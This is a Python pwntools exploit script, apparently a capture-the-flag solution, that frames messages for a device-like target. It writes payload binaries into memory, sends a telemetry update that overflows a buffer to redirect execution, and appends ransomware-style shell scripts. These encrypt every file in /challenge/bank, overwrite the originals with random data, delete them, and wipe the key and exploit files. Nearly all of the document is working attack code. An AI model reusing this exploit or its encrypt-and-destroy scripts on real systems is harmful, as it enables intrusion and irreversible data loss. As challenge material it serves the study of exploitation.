from pwn import p32, p64, u32, u64, context
from struct import pack, unpack
import sys 

context.log_level = 'error'

def crc16(data : bytearray, offset , length):
    if data is None or offset < 0 or offset > len(data)- 1 and offset+length > len(data):
        return 0
    crc = 0x1D0F
    for i in range(0, length):
        crc ^= data[offset + i] << 8
        for j in range(0,8):
            if (crc & 0x8000) > 0:
                crc =(crc << 1) ^ 0xA02B
            else:
                crc = crc << 1
    return crc & 0xFFFF

def wrapMessage(target, cmd, data):
    return b"\x55\xAA" + pack("<HHbb", len(data), 
                crc16(data, 0, len(data)), target, cmd) + data

def unwrapMessage(msg): 
    start, length, crc, target, cmd = unpack("<HHHbb", msg[:8])
    return msg[8:8+length]

TLM_TARGET  = 1
TLM_REQ     = 0 
TLM_UPDATE  = 1
def req_tlm():
    return wrapMessage(TLM_TARGET, TLM_REQ, b"")

MEM_TARGET  = 2
MEM_READ    = 0
MEM_WRITE   = 1
def write_mem(addr, mem):
    header = pack(b"<HH", addr, len(mem))
    return wrapMessage(MEM_TARGET, MEM_WRITE, header + mem)

def read_mem(addr, length): 
    header = pack(b"<HH", addr, length)
    return wrapMessage(MEM_TARGET, MEM_READ, header)

SYS_TARGET  = 3
SHUTDOWN_CMD = 0
LOGGER_CMD = 3

def shutdown():
    return wrapMessage(SYS_TARGET, SHUTDOWN_CMD, b"")

def exploit():
    return wrapMessage(TLM_TARGET, TLM_UPDATE, b"A"*0x14 + p64(0x12800000))

def exploitChallenge(p):
    with open("payload1.bin", 'rb') as f: 
        data = f.read()
    addr = 0
    while addr < len(data):
        end = min(addr+64, len(data))
        m = write_mem(addr, data[addr:end])
        p.write(m)
        addr += 64
    p.write(exploit())
    
    with open("payload2.bin", 'rb') as f: 
        data = f.read()
    p.write(p32(len(data)))
    p.write(data)

    seedFile = b"/challenge/gen"
    p.write(seedFile + b"\x00"*(32-len(seedFile)))
    seedStr = b"#!/bin/sh\necho \"$(echo '77ef3e4ce2b23c4406ec65b5c409ced891fbbe51')$(domainname -A)\"|sha256sum|cut -d' ' -f1>/challenge/key" 
    p.write(seedStr + b"\x00"*(128-len(seedStr)))
    
    keyFile = b"/challenge/key"
    p.write(keyFile + b"\x00"*(32-len(keyFile)))
    
    ransomFile = b"/challenge/ransom"
    p.write(ransomFile + b"\x00"*(32-len(ransomFile)))
    script = \
b"""#!/bin/bash\nfor f in /challenge/bank/*;do\nopenssl enc -aes-256-cbc -a -pbkdf2 -in "$f" -out "$f".enc -k $(cat /challenge/key)\ndd if=/dev/urandom of=$f bs=1024 count=10\nrm "$f"\ndone
for f in /challenge/{gen,key,exploit.bin}; do\ndd if=/dev/urandom of=$f bs=1024 count=10\nrm $f\ndone\n"""
    p.write(script + b"\x00"*(1024-len(script)))

if __name__ == "__main__":
    with open("exploit.bin", "wb") as p:
        exploitChallenge(p)